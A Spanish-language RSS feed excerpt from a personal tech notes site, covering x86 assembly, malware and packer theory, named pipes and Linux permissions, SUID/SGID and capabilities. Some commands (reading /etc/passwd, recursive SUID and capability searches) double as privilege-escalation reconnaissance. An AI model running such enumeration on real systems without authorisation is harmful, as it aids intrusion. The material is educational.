<br>La instrucción sub (Substraction) resta el segundo operando del primero y almacena el resultado en el operando de destino.<br>Syntax<br>sub {destination}, {source}
Copy<br>Examples<br>sub eax, ebx         ; eax = eax - ebx
Copy<br>
<br>


<br>La instrucción mul (Multiply) multiplica el registro acumulador (EAX) por el operando fuente. El resultado se almacena en EAX y EDX. <br>Syntax<br>mul {source}
Copy<br>Examples<br>mov eax, 5
mov ebx, 3
mul ebx         ; EAX = EAX * EBX (EAX = 15, EDX = 0 if is not overflow)
Copy<br><br>Las instrucciones de control de flujo (Flow Control Instructions) en ensamblador son esenciales para controalr el flujo de ejecución de un programa. Estas instrucciones permiten desviar la ejecución a diferentes partes del código, realizar bucles, y tomar decisiones basadas en condiciones. Las más comunes incluyen jmp, call, ret y varias instrucciones de salto condicional.<br>
<br>


<br>La instrucción jmp (Jump) redirije el flujo del programa a la localización de memoria especificada por el operando.<br>Syntax<br>jmp {label}
Copy<br>Examples<br>jmp begin          ; Jump to the instruction labeled "begin."
Copy<br>
<br>


<br>Estas instrucciones permiten redirigir el flujo del programa basado en el estado de los códigos de condición almacenados en Machine Status Word, un registro especial que conserva información sobre la última operación aritmética. Por ejemplo, un bit indica si el último resultado fue cero, mientras que otro indica negatividad. Se pueden ejecutar varios saltos condicionales según estos cófigos de condición. Por ejemplo, la instrucción jz salta a la etiqueta especificada si la última operación aritmética arrojó cero; del contrario, el control se realiza de forma secuencial.<br>Syntax<br>je {label}       ; Jump if equal
jne {label}      ; Jump if not equal
jz {label}       ; Jump if  last result was zero
jg {label}       ; Jump if grater than
jge {label}      ; Jump if grater than or equal to
jl {label}       ; Jump if less than
jle {label}      ; Jump if less than or equal to
Copy<br>Examples<br>cmp eax, ebx
jle done
Copy<br>Si el contenido del registro EAX es menor o igual al contenido de EBX, el programa redirigirá el flujo del mismo a la etiqueta "done", de lo contrario seguida con la siguiente instrucción.<br>
<br>


<br>La instrucción cmp (Compare) comparará dos valores de dos operandos específicados, ajustando los códigos de condición en la palabra de estado del registro Machine Status Word. Funcionalmente similar a la instrucción sub, descartará el resultado de la resta en lugar de reemplazar el primer operando.<br>Syntax<br>cmp {destination}, {source}
Copy<br>Examples<br>cmp ebx, [var]     ; cmp {reg}, {mem}
cmp ecx, ebx       ; cmp {reg}, {reg}
cmp [ebx], ecx     ; cmp {mem}, {reg}
cmp ebx, 10        ; cmp {reg}, {const}
Copy<br>
<br>


<br>La instrucción call (Call Procedure) enviará (push) la ubicación del código actual en la pila en la memoria y luego saltará incondicionalmente a la ubicación del código especificada. A diferencia de las instrucciones de jmp simples, call guardará la ubicación de retorno para completar la subroutine.<br>Syntax<br>call {label}
Copy<br>Examples<br>call subroutine       ; Call the subroutine "subroutine"
Copy<br>
<br>


<br>La instrucción ret (Return from procedure) implementará un mecanismo de retorno al subroutine. Primero extrae una ubicación de código del stack y luego salta incondicionalmente a la ubicación recuperada.<br>Syntax<br>ret
Copy<br>Examples<br>ret        ; Return to the return address stored in the stack
Copy<br><br><br>
<br>Source code: Archivo hello.s: 
<br>section .data
	msg db 'Hello, World!', 0

section .text
	global _start

_start:
	; Write the message to stdout
	mov eax, 4         ; sys_write = 4 
	mov ebx, 1         ; file descriptor (stdout = 1)
	mov ecx, msg       ; message to write
	mov edx, 13        ; message length
	int 0x80           ; call kernel

	; Exit the program
	mov eax, 1         ; sys_exit = 1
	xor ebx, ebx       ; exit code 0
	int 0x80           ; call kernel
Copy<br>
<br>Assembly: Ensamblamos el código en lenguaje ensamblador a archivo objeto:
<br>as -o hello.o hello.s
Copy<br>
<br>Linking: Enlazamos el o los archivo/s objeto/s:
<br>ld -o hello_world hello.o
Copy<br><br>Referencias y recomendaciones:<br>
<br><a rel="noopener nofollow" class="external-link" href="https://elswix.github.io/articles/2/assembly-instructions-intel-x86.html" target="_blank">https://elswix.github.io/articles/2/assembly-instructions-intel-x86.html</a>
<br><a rel="noopener nofollow" class="external-link" href="https://www.cs.virginia.edu/~evans/cs216/guides/x86.html" target="_blank">https://www.cs.virginia.edu/~evans/cs216/guides/x86.html</a>
]]></description><link>https://dobliuw.com/notes/3.-system/global-concepts/low-level-concepts/assemblly-&amp;-cpu-fundamentals/1.-assembly-instructions-(x86).html</link><guid isPermaLink="false">Notes/3. System/Global Concepts/Low-Level Concepts/Assemblly &amp; CPU Fundamentals/1. Assembly Instructions - (x86).md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Thu, 27 Jun 2024 19:44:13 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/push_instruction_low_level_example_1.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/push_instruction_low_level_example_1.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[Malware]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:teoria" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#teoria</a> <a class="tag" href="https://dobliuw.com/?query=tag:malware" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#malware</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:teoria" class="tag" target="_blank" rel="noopener nofollow">#teoria</a> <a href="https://dobliuw.com?query=tag:malware" class="tag" target="_blank" rel="noopener nofollow">#malware</a> 
<br><br><br>El término malware es una abreviatura de malicious software (Software Malicioso). Se refiere a cualquier tipo de software diseñado con el propósito de dañar, robar información, causar interrupciones o realizar actividades no autorizadas en un sistema informático o dispositivo. El maware es un término geeneral que abarca una amplia variedad de programas malilciosos, cada uno con sus propias características y objetivos, algunos de los malwares más comunes son:<br>
<br>Virus: Un virus es un programa malicioso que se adhiere a otros porgramas legítimos y se propaga cuando se ejecutan esos programas. Los virus puede dañar archivos y programas, y se propagan a través de la ejecución de archivos infectados.
<br>Gusano (Worm): A diferencia de los virus, los gusanos son capaces de propagarse sin necesidad de un programa anfitrión. Se replican a sí mismos y se propagan a través de redes y sistemas sin intervención humana.
<br>Troyano (Trojan): Los toryanos son programas que se disfrazan como software legítimo pero, en realidad, tienen un propósito malicioso. Pueden robar datos proporcionar acceso no autirzado a un sistema, o realizar otras actividades dañinas.
<br>Spyware: El spyware se utiliza para recopilar información personal o de navegación de un usuario sin su conocimiento y concentimiento. Puede rastrear actividades en línea, robar contraseñas y datos personales, y enviarlos a terceros.
<br>Adware: El adware muestra anuncios no deseados en el sistema o navegador del usuario. aunque no siempre es malicioso, puede ser molesto y degradar el rendimiento del dispositivo.
<br>Ransomware: El ransomware cifra los archivos o bloque el acceso a un sistema y luego exige un rescate para desbloquear o descifrar los datos. Es un tipo particularmente destructutivo de malware.
<br>Rootkit: Los rootkits son programas diseñados para ocultar la presencia de otros malware en un sistema. Puede moficiar el sistema operativo para mantenerse ocultos y difíciles de eliminar.
<br>Botnet: Un botnet es una red de dispositivos infectados que pueden ser controlados de forma remota por un atacante. Los dispositivos infectados, llamados bots, pueden utilizarse para llevar a cabo actividades maliciosas, como ataques distribuidos de denegración de servicio (DDoS).
<br><br><br>La evolución de las amenazas cibernéticas y las técnicas utilizadas por los atacantes han llevado el desarollo a diversas estrategias destinadas a ocultar, ofuscar y proteger el malware de la detección y el análisis.<br>El payload, que es el malware que el atacante quiere ejecutar en la máquina victima, puede estar protegido contra ingenieria inversa y detecciones de softwares de seguridad. Esto esta hecho con código agregado (Que no es estrictamente malicioso), si no que solo intenta esconder el código malicioso. Por lo tanto, el objetivo es ocultar el payload a la víctima y a los investigadores que tienen en sus manos el archivo malicioso.<br>Dentro de estas ténicas, existen tres pincipales, las cuales son los Packers, Crypters y Protectors.<br><br>El término Packers es usualmente la forma corta de referirse a los Runtime Packers, que también son conocidos como Self-Extracting Archives. Software que se descomprime ne la memoria cuando se ejecuta el "Archivo empaquetado (Packed File)". A veces, esta técnica también se denomina executable compression. Este tipo de compresión se inventó para hacer que los archivos fueran más pequeños. POr lo tanto, los usuarios no tendrían que desempaquetarlos manualmente antes de que pudieran ejecutarse. Pero dado el tamaño actual de los medios portátiles y las velocidadeds de internet, la necesidad de archivos más pequeños ya no es tan urgente. Entonces, cuando se ve que algunos empacadores se usan hoy en día, casi siempre es con fines maliciosos. En esencia, para hacer que la ingeniería inversa sea más difícil, con el beneficio adicional de una huella más pequeña en la máquina infecatada.<br><br>La técnica más rudimentaria para los Crypters suele llamarse Obfuscation. Esta se usa a menudo en scripts, como javascripts y vbscripts. Pero la mayoría de las veces no son muy dificiles de eludir o desofuscar. La myoría de los Crypters no solo encriptan el archivo, si no que el software de encriptación ofrece al usuario muchas otras opciones para hacer que el ejecutable oculto sea lo más difícil posible de detectar por los proveedores de seguridad.<br><br>Un Protector es el software que está destinado a evitar la manipulación y la ingeniería inversa de los programas. Los métodos utilizados puede, y generalmente incluirán, tanto el Packer como el Crypter. Esa combinación, más algunas características adicionales, hace lo que generalmente se conoce como un Protector. Por lo tanto, un investigador se enfrentará a capas protectoras alrededor del payload, lo que dificultará la ingeniería inversa.]]></description><link>https://dobliuw.com/notes/3.-system/global-concepts/malware/malware.html</link><guid isPermaLink="false">Notes/3. System/Global Concepts/Malware/Malware.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Thu, 04 Apr 2024 17:34:26 GMT</pubDate></item><item><title><![CDATA[Named and Unnamed Pipes]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:teoria" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#teoria</a> <a class="tag" href="https://dobliuw.com/?query=tag:sistemas" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#sistemas</a> <a class="tag" href="https://dobliuw.com/?query=tag:pipes" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#pipes</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:teoria" class="tag" target="_blank" rel="noopener nofollow">#teoria</a> <a href="https://dobliuw.com?query=tag:sistemas" class="tag" target="_blank" rel="noopener nofollow">#sistemas</a> <a href="https://dobliuw.com?query=tag:pipes" class="tag" target="_blank" rel="noopener nofollow">#pipes</a>
<br><br><br>Los Pipes son un Mecanismo de Comunicación entre Procesos, más conocido como IPC. Un pipe es una forma de establecer una comunicación unidireccional entre dos procesos. <br>Las comunicaciones Pipes utilizan la implementación First-in-First-out (FIFO).<br>Esto significa que el primer byte de data escrito en un pipe será el primer byte de data que será leido por el mismo. Despues de que los datos sean leídos por el pipe, ya no está disponible dentro del búfer de datos de la tubería y, por lo tanto, no se puede volver a leer.<br><br><br>Existen dos principales tipos de Pipes: Named Piepes, los cuales son Pipes con nombre y Anonymous Pipes, los cuales no tienen nombre.<br>Un ejemplo de un Named Pipe puede ser aquel que utilizemos en sistemas Unix con el comanod mkfifo, ejemplo:<br>mkfifo named_pipe_example # Creación de named pipe
cat /etc/passwd &gt; named_pipe_example # Stdout redirigido a el named pipe

more &lt; named_pipe_example # Leyendo datos del pipe
Copy<br>De esta manera, estamos haciendo uso del comando mkfifo para la creación de un named pipe, en este caso con el nombre de named_pipe_example, donde posteriormente estamos enviando los datos del stdout del comando cat /etc/passwd, donde posteriormente desde otro procesos estamos leyendo los datos de este pipe con otro comando el cual es more &lt; named_pipe_example.<br>Así mismo, un ejemplo de Anonymous Pipes / Unnamed Pipes es el uso cotidiano de la concatenación de comandos en sistemoas Unix, por ejemplo:<br>cat /etc/passwd | grep 'root' | tr ':' '&gt;'
Copy<br>En este caso, mediante el uso de unnamed pipes estamos concatenando el stdout de un comando, para convertirlo mediante pipes en el stdin de otro comando y así susesivamente.<br>En el caso de Windows esto es un poco más avanzado y complejo. Pero recursos como <a data-tooltip-position="top" aria-label="https://www.ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation" rel="noopener nofollow" class="external-link" href="https://www.ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation" target="_blank">este</a> hablan de la explicación de Named Pipes en Windows y su explotación por parte de los atacantes.<br>Podríamos intentar listar todos los Pipes de Windows con el siguiente comando de PowerShell:<br># Opción 1 
$pipes = [System.IO.Directory]::GetFiles("\\.\\pipe\\")
echo $pipes

# Opción 2
Get-ChildItem \\.\pipe\
Copy<br>Mientras que en linux podríamos hacer uso de:<br>find / -type p 2&gt;/dev/null
Copy<br>]]></description><link>https://dobliuw.com/notes/3.-system/global-concepts/named-pipes/named-and-unnamed-pipes.html</link><guid isPermaLink="false">Notes/3. System/Global Concepts/Named Pipes/Named and Unnamed Pipes.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Wed, 07 Feb 2024 14:22:57 GMT</pubDate></item><item><title><![CDATA[Binary files]]></title><description><![CDATA[ 
 <br><br>Los archivos binarios son archivos normales que contienen información que el sistema puede leer. Los archivos binarios podrían ser archivos ejecutables que indicaran al sistema que ha de realizar un trabajo. Los metadatos y los programas se almacenan en archivos binarios ejecutables.<br><br><br>En Linux (Y en sistemas operativos basasdos en Unix en general), los términos absolute path y relative path/dynamic path, se refieren a la forma en la que se especifica la ubicación de un archivio o directorio en el sistema de archivos.  <br><br>Un absolute path o absolute route especifica la ubicación completa de un archivo o directorio desde la ráiz del sistema de archivos. Siempre comienza con una barra diagonal (/), que representa el directorio raíz. Debido a que un path absoluto específica la ruta completa, puede ser utilizado desde cualquier lugar en el sistema para referirse al mismo archivo o directorio.<br>
<br>/home/dobliuw/Destkop/file.sh
<br><br>Un relative path/dynamic path  o relative/dynamic route especifica la ubicación de un archivo o directorio en relación con el directorio actual en el que nos encontramos. No comienza con una barra diagonal (/). Los paths relativos dependen de tu ubicación actual en el sistema de archivos, y pueden usar notaciones especiales como . (para el directorio actual) y .. (para el directorio padre)<br>
<br>whoami (Manera relativa de hacer alusión a /usr/bin/whoami, si este esta en la variable de entorno PATH).
<br>../Downloads/downloaded_file.txt (Si estamos en /home/dobliuw/Desktop).
<br>
<br><br><br>Las variables de entorno son pares clave-valor que se utilizan en sistemas operativos para almacenar información que puede ser utilizada por aplicaciones y procesos en ejecución. Estas variables proporcionan una forma de configurar y pasar información a los programas sin necesidad de modificar el código fuente del programa. Son sesenciales en sistemas operativos basados en Linux, Unix o sistemas opeartivos como MacOS y Windows.<br>Algunas de las variables de entorno más comunes son: <br>
<br>PATH: Contiene una lista de directorios donde el sistema busca ejecutables. Ejemplo: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin.
<br>HOME: El directorio home del usuario actual. Ejemplo: /home/usuario.
<br>USER: El nombre del usuario actual. Ejemplo: usuario.
<br>SHELL: El shell predeterminado del usuario. Ejemplo: /bin/bash.
<br>Para listar las variables de entornos en el sistema, así como el contenido de una variable de entorno determinada, haremos uso de:<br># Print env vars
printev
# Print env vars
env 
# List the content of one env var
echo $PATH
Copy<br>Asignar valores a variables de entornos:<br>export PATH="/my/personal/path/:$PATH"
Copy<br>Es importante tener en cuenta que esta modificación de variables de entornos, o la exportación de nuevas, se mantendrá en la sesión de la terminal utilizada, pero tras finalizar esta el contenido modifcado o la nueva variable creada se perderá. Para modificar o exportar variables de entornos nuevas de manera permanente deberíamos retocar el archivo ~/.bashrc o ~/.zshrc, dependiendo la consola que manejemos.<br><br><br>Los archivos .bashrc (Para el uso de la shell bash) o .zshrc (Para el uso de la shell zsh) son archivos de configuración utilizados en sistemas UNix y LInux para personalizar el entorno de usuario cuando se inicia una nueva sesión de terminal. Estos archivos contienen comandos de shell que se ejecutan automáticamente cada vez que abrimos una nueva terminal, aquí podemos declarar nuestros aliases, funciones, variables de entorno, configuración de prompt y demás utilidades.<br>El path absoluto de este archivo se encuentra en el directorio personal del usuario como archivo oculto, es decir /home/{username}/.bashrc. Para aplicar los cambios ingresados en el archivo sin la necesidad de cerrar y volver a abrir una terminal, podemos hacer uso del comando source ~/.bashrc.<br><br><br><br>stdin (Standard Input) es un flujo de entrada estándar. Por defecto, recibe la entrada del teclado y se puede encontrar representado como un 0. Se puede redirigir desde un archivo o un comando.<br># Insert a path into a file
echo '/home/kali/Desktop' &gt; test.txt
# Take like input the content (Path) of the file
ls -l &lt; test.txt

ls -l &lt; $(pwd)
Copy<br><br>stdout (Standard Ouput) es el flujo de salida estándar. Por defecto, envía la salida a la terminal y se puede encontrar representado como un 1. Se puede redirigir a un archivo o a otro comando.<br># Redirect the stdout 
echo "hola" &gt; test.txt
cat /etc/passwd &gt; etc_passwrd.backup
# Redirect the stdout from echo command without overwrite content
echo " como estas?" &gt;&gt; test.txt
Copy<br><br>stderr (Stander Error) es el flujo de error estándar. Por defecto, envía los mensajes de error a la terminal y se puede encontrar representado como un 2. Se puede redirigir a un archivo.<br># Redirect the error about command ech not found to a file
ech 2&gt; error.txt
# Redirect possible errors to the /dev/null
./script.sh 2&gt; /dev/null
Copy<br>El /dev/null es una ruta del sistema utilizada para redirigir flujos estandar y no visualizar el mismo ni almacenarlos en ningun lado del sistema. <br><br>En el contexto de la línea de comandos de Linux, los operadores lógics se utilizan para combinar y controlar la ejecución de comandos<br>El operador lógico AND ejecutará el segundo comando solo si el primer comando retorna 0 (Es exitoso):<br># AND = &amp;&amp;
./script.sh &amp;&amp; echo "Script succesfully exectued" 
Copy<br>El operador lógico OR ejecutará el segundo comando solo si el primer comando retorna algún código de error (Falla):<br># OR = ||
./script.sh || echo "An unexpected error ocurred"
Copy<br>El operador lógico SEPARATOR ejecuta lso comandos en secuencia, independientemente del resultado del anterior.<br># SEPARATOR = ; 
./script1.sh; ./script2.sh; echo "Scripts executed"
Copy<br><br>En Linux, podemos ejecutar procesos en segundo plano par que no bloqueen la terminal ,permitiendo que sigamos haciendo uso de la misma:<br># Execute in background
command &amp;
# Look background proccess
jobs
# Take a process from background
fg %{task_number}
# Kill a background process
kill %{task_number}
Copy<br>También podemos envíar un proceso a segundo plano pausando su ejecución en primer plano utilizando Ctrl + Z y enviarlo a segundo plano con bg.<br><br>Los descriptores de archivos son un número entero no negativo que representan un canal abierto para la entrada/salida de datos. Cada FD (File Descriptor) es un índice en una tabla que el kernel del sistema opeartivo mantiene para cada proceso. Esta tabla mapea los FDs a estructuras de datos más complejas que describen los recursos de E/S (Como archivos, sockets, pipes, etc).<br><br>
<br>0: Es decir el stdin.
<br>1: Es decir el stdout.
<br>2: Es decir el stderr.
<br><br>Los FDs se utilizan principalmente para manejar la entrada y salida de  datos en scripts y programas.<br>
<br>Redirigar el stdin:
<br>command &lt; input_file
Copy<br>
<br>Redirigir el stdout:
<br>command &gt; output_file
command &gt;&gt; output_file
Copy<br>
<br>Redirigir el stderr:
<br>command 2&gt; error_file
command 2&gt;&gt; error_file
Copy<br>
<br>Redirigir ambas salidas (stdout y stderr):
<br># Redirect both outputs
command &amp;&gt; both_output_and_error_file
# Redirect the stdout to file but duplicating the stderr to stdout too
command &gt; both_output_and_error_file 2&gt;&amp;1 
Copy<br><br>A veces es útil duplicar los FDs para que múltiples descriptores se refieran al mismo archivo o recurso. Este se hace a menudo usando el comando exec en shells como Bash.<br>
<br>Duplicar stdout en stderr.
<br>exec 2&gt;&amp;1
Copy<br>Esto hará que stderr (FD 2) duplique stdout (FD 1), por lo que ambos flujos se dirigirán al mismo lugar.<br>
<br>Duplicar stderr en stdout.
<br>exec 1&gt;&amp;2
Copy<br>Esto hará que stdout (FD 1) duplique stderr (FD 2), por lo que ambos flujos se dirigirán al mismo lugar.<br><br>El comando exec en shells Unix puede utilizarse para manipular FDs de una manera más avanzada como ya mencionamos<br>
<br>Crear y abrir un archivo (Creación de un FD implícitamente):
<br># Assing the FD 3 to output.txt
exec 3&gt; output.txt 
# Duplicate stdout (FD 1) in FD 3 (output.txt)
Copy<br>
<br>Cerrar un FD:
<br>exec 3&gt;&amp;-
Copy<br>
<br>Redirigir contenidos a un FD:
<br>echo "This goes to stout via FD 3" &gt;&amp;3
Copy<br><br><br>En sistemas Unix y Linux, los permisos de archivos son fundamentales para la seguridad y la gestión de recursos. Vamos a entender como se asignan e interpretan estos tanto en notación simbólica como en notación octal.<br><br>Cada archivo y directorio tiene un conjunto de permisos que esepecifican quién puede leer, escribir y ejecutar el archivo. Estos permisos se dividen en tres categorías:<br>
<br>User (El Usuario, dueño del archivo)
<br>Group (El group, group al que pertenece el archivo)
<br>Others (Otros, todos los demás usuarios)
<br><br>Hay tres tipos básicos de permisos:<br>
<br>r (read): Permiso de lectura. Permite ver el contenido del archivo.
<br>w (write): Permiso de escritura. Permite modificar el contenido del archivo.
<br>x (execute): Permiso de ejecución. Permite ejecutar el archivo si es un script o un binario.
<br><br>La notación simbólica representa los permisos como una cadena de caracteres, dividida en tres secciones de tres caracteres cada una. Cada sección representa los permisos para el usuario, group y otros<br>Por ejemplo, el directorio /home de, por ejemplo, el usuario kali, contiene directorios con permisos completos para el usuario (r - w - x) y permisos de lectura y ejecución (En caso de ser un directorio, indicando que se puede ingresar al mismo) para usuario pertenecientes al grupo kali y otros usuarios.<br><img alt="linux_permits.png" src="https://dobliuw.com/lib/media/linux_permits.png"><br>
<br>rwx: Permisos de lectura, escritura y ejecución.
<br>r--: Permisos de lectura.
<br>-w-: Permisos de escritura.
<br>--x: Permisos de ejecución.
<br>---: Sin permisos.
<br><br>La notación octal es una forma más compacta de representar los permisos de archivo. Utiliza un número octal de tres dígitos, donde cada dígito representa una categoría de permisos (usuario, grupo y otros).<br>Cada permiso se representa por un número:<br>
<br>r (read) = 4
<br>w (write) = 2
<br>x (execute) = 1
<br>Estos valores se consiguen remplazando aquellas letras de permisos existentes con un 1 y aquellas que no (-) con un 0. De esta manera se eleva el número 2 según la posición de esta letra de izquierda a derecha:<br><img alt="octal_low_level_explained.png" src="https://dobliuw.com/lib/media/octal_low_level_explained.png"><br>Estos números se suman para obtener un valor octal de cada conjunto de permisos, voliendo al ejemplo del directorio /home/kali, donde los permisos son drwxr-xr-x la representación octal de esto sería:<br>
<br>
User = rwx = 4 + 2 + 1 = 7

<br>
Group = r-x = 4 + 0 + 1 = 5

<br>
Others = r-x = 4 + 0 + 1 = 5
La representación final de los permisos rwxr-xr-x sería 755

<br><br>El comando chmod lo utilizaremos para cambiar los permisos de un archivo o directorio, podemos hacer uso de la notación octal o simbólica. Cuango hagamos uso de la notación simbólica utilizaremos los caracteres u, g y o para referirnos respectivamente al usuario, grupo y otros, por otro lado utilizaremos los signos de suma (+) y resta (-) para sumar permisos o restarlos, y los caracteres w, r y x para referirnos respectivamente a permisos de escritura, lectura y ejecución.<br># Give all permits to user
chmod u+rwx file.sh
# Make file.sh Inaccessible, unreadable and unexecutable 
chmod o-rwx file.sh
# Give read and execute permits to group and execute permit to others 
chmod g+rx,o+x
Copy<br>Para la notación octal simplemente deberemos introducir el dígito final obtenido, por ejemplo 755.<br># Five all permits to everyone
chmod 777 file.txt
Copy<br><br>Este archivo se encuentra en progreso de re-redacción, dado que el mismo fue redactado cuando me estaba adentrando en el mundo de la tecnología, con linux y las herramientas para toma de apuntes y conocimientos no eran los mismos que a día de hoy 17/05 (Así que sepan que se encuentra en redacción).<br><br><br>El sticky bit en Linux es una característica de los sistemas de archivos Unix y Linux que se usa para controlar el acceso a los archivos en un directorio específico. Es particularmente útil para directorios donde múltiples usuarios pueden tener permisos de escritura, como /tmp. El sticky bit asegura que solo el propietario de un archivo pueda eliminar o renombrar ese archivo, incluso si otros usuarios tiene permisos de escritura en el directorio.<br>Para verificar si el Sticky Bit está establecido en un directorio, podemos hacer uso del comando ls -ld<br>ls -ld /tmp

# drwxrwxrwt 10 root root 4096 Jun 16 12:34 /tmp
Copy<br>El caracter t en los permisos indica que el sticky bit está establecido. Así mismo, para asignar este permiso de manera simbólica u octal, podemos hacer uso de chmod y la flag +t o de 1xxx para el modo octal. <br>chmod +t /directory

chmod 1xxx /directory
Copy<br>Este permiso especial debe usarse en directorios donde múltiples usuarios tienen permisos de escritura para evitar la eliminación accidental o maliciosa de archivos.<br><br><br>Los comandos lsattr y chattr en Linux se utilizan para cambiar y listar los atributos de los archivos y directorios en sistemas de archivos ext2, ext3 y ext4 (<a data-href="Operative Systems Basics#Files Systems" href="https://dobliuw.com/notes/3.-system/operative-systems/operative-systems-basics.html#Files_Systems" class="internal-link" target="_self" rel="noopener nofollow">Operative Systems Basics &gt; Files Systems</a>). Estos atributos pueden ser usados para mejorar la seguridad y el control de los archivos y directorios en el sistema.<br><br>El comando chattr permite cambiar ciertos atributos de archivos y directorios, algunos comunes son:<br>
<br>a: Append only. El archivos sólo puede ser abierto en modo de añadir. Sólo root puede establecer o eliminar este atributo.
<br>i: Immutable. El archivo no puede ser modoficado, ni eliminado, ni enlazado, renombrado o reescrito. Sólo root puede establecer o eliminar este atributo.
<br>d: No dump. El archivo no se incluirá en los respaldos realizados por el comando dump.
<br>u: Undelete. El contenido del archivo se guarda para que pueda ser recuperado si se elimina. Este atributo no siempre está disponible en todas las implementaciones de sistemas de archivos
<br>Estos atributos pueden ser agregados (+) o eliminados (-) de archivos o directorios. Adicionalmente se puede hacer uso de = para establecer exactamente los atributos deseados.<br><br>El comando lsattr se utiliza para listar los atributos de los archivos y directorios. Es útil para verificar los atributos actuales de un archivo o directorio.<br>lsattr file.txt
# ----i--------e---- file.txt
# -R -&gt; Recursive &amp; -a Add hidden files
lsattr -Ra /directory/path
Copy<br><br><br>Los permisos SUID (Set User ID) y SGID (Set Group ID) son características especiales de los sistemas de archivos Unix y Linux que afectan la forma en que los programas se ejecutan y los archivos y directorios se manejan.<br><br>Cuando un archivo ejecutable tiene el permiso SUID, el archivo se ejecuta con los privilegios del propietario del archivo, no con los del usuario que lo ejecuta. <br>
<br>Establecer SUID: 
<br>chmod u+s file

chmod 4xxx file
Copy<br>Un archivo con SUID tendrá una s en los permisos del usuario:<br>ls -l file
# -rwsr-xr-x 1 root root 12345 Jun 16 12:32 file
Copy<br>Para buscar archivos SUID de manera recursiva en el sistema, podríamos hacer uso de la herramienta find:<br>find / -perm /4000 2&gt;/dev/null
Copy<br><br>Para archivos ejecutables, SGID funciona de manera similar al SUID, pero se aplica al grupo. el programa se ejecuta con los permisos del grupo propietario del archivo.<br>Para directorios con permisos SGID asegura que los archivos creados dentro del directorio hereden el grupo del directorio, en lugar del grupo principal del usuario que crea el archivo..<br>
<br>Establecer SGID:
<br>chmod g+s file/directory

chmod 2xxx file/directory
Copy<br>Un archivo SGID tendrá una s en los permisos del grupo:<br>ls -l file/directory
# -rwxr-sr-x 1 user group 12345 Jun 16 12:33 file
# drwxr-sr-x 2 user group 4096 Jun 16 12:34 directory
Copy<br>Para buscar archivos SGID de manera recursiva en el sistema, podríamos hacer uso de la herramienta find nuevamente:<br>find / -perm /2000 2&gt;/dev/null
Copy<br><br><br>En sistemas operativos Unix y Linus, las capabilities son una forma más granula de control de privilegios que el tradicional modelo de superusuario (root). En lugar de otorgar todos los privilegios a un proceso, se pueden otorgar aquellos necesarios para realizar una tarea específica, mejorando la seguridad y reduciendo el riesgo de privilege scalation.<br>Algunos ejemplos de capabilities pueden ser:<br>
<br>
CAP_NET_ADMIN para tareas de administración de red.

<br>
CAP_SYS_BOOT para permitir reiniciar el sistema.

<br>
CAP_CHOWN para cambiar la propiedad de archivos.

<br>
CAP_NET_RAW para permitir hacer uso de sockets RAW y operaciones de red de bajo nivel.

<br>
Listar las capabilities de un archivo:

<br>getcap /path/to/file
Copy<br>
<br>Listar desde la raiz las capabilities de los archivos:
<br>getcap -r / 2&gt;/dev/null
Copy<br>
<br>Asignar capabilities:
<br>sudo setcap cap_setuid+ep /path/to/executable
sudo setcap cap_net_admin+ep /path/to/executable
Copy<br>
<br>Eliminar capabilities de un archivo:
<br>sudo setcap -r /path/to/executable
Copy<br><br><br>En Linux, la estructura de directorios, similar a <a data-href="0. Windows Basics#Directory Structure" href="https://dobliuw.com/notes/3.-system/operative-systems/windows/0.-windows-basics.html#Directory_Structure" class="internal-link" target="_self" rel="noopener nofollow">0. Windows Basics &gt; Directory Structure</a>, también sigue una jerarquía de árbol similar a otros sistemas operativos Unix-like. Esta estructura roganiza los archivos de manera que sean accesibles y gestionables tanto para el sistema operativos como para los uusarios.<br>La raíz de la estructura de directorios en sistemas Linux es:<br>
<br>
/: El directorio raíz, es la base de todo el sistema de archivos en Linux.  Todos los demás directorios y archivos cuelgan de este directorio. Es el punto de inicio para la estructura jerárquica de a rchivos.

<br>
/bin: Contiene binarios esenciales para el sistema, necesarios para la operación en single-user mode y para todos los usuarios, por ejemplo ls, cp, mv, bash, etc.

<br>
/boot: Almacena los archivos de arranque necesarios para iniciar el sistema, incluyendo el kernel de Linux (vmlinuz), archivos de configuración del gestor de arranque (GRUB o LILO) y el initial RAM disk (<br>
initrd).

<br>
/dev: Contiene archivos de dispositivos que representan dispositivos físicos y virtuales. Estos archivos permiten que el software interactúe con el hardware, por ejemplo /dev/sda para un disco duro.

<br>
/etc: Almacena todos los archivos de configuración del sistema y los scripts de inicio. Incluye configuraciones para el sistema operativo y servicios instalados, por ejemplo /etc/passwd, /etc/fstab, /etc/hostname, etc.

<br>
/home: Directorio que conteine los directorios personales de los usuarios. Cada usuario tiene su propio directorio bajo /home, por ejemplo /home/dobliuw. Aquí es donde se almacena los archivos personales y configuracinoes específicas de cada usuario.

<br>
/lib: Contiene bibliotecas compartidas esenciales para el sistema necesarias para ejecutar binarios en /bin y /sbin. también incluye módulos del kernel, por ejemplo /lib/modules.

<br>/lib64: Directorio existente en sistemas operativos x64 el cual almacena bibliotecas para binarios de 64 bits.


<br>
/media: Directorio donde se montan dispositivos de almacenamiento extraíbles automáticamente, como CD-ROMs, DVDs y unidades USB.

<br>
